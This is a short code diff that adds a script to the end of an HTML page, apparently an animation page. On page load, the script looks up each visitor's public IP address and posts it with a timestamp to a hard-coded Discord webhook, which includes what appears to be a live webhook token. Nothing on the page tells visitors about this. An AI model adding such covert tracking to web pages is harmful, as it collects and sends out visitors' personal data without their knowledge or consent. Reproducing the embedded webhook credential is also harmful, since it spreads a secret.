@@ -120,6 +120,24 @@ draw();
 
 window.addEventListener("resize", resetDrops);
 </script>
+<script>
+  // 訪問者のIPアドレスを取得してDiscordに送信
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      const webhookUrl = 'https://discord.com/api/webhooks/1539148282901827625/ywbiBu7Xko4vofcqNeA4X8I9ynNrFssWs7ROh7eqo9C7nfIBMs2phr516KBRHTnSikIi';
+      
+      const payload = {
+        content: `🚨 **アクセス通知**\nIPアドレス: \`${data.ip}\`\n日時: ${new Date().toLocaleString('ja-JP')}`
+      };
 
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    })
+    .catch(err => console.error(err));
+</script>
 </body>
 </html>
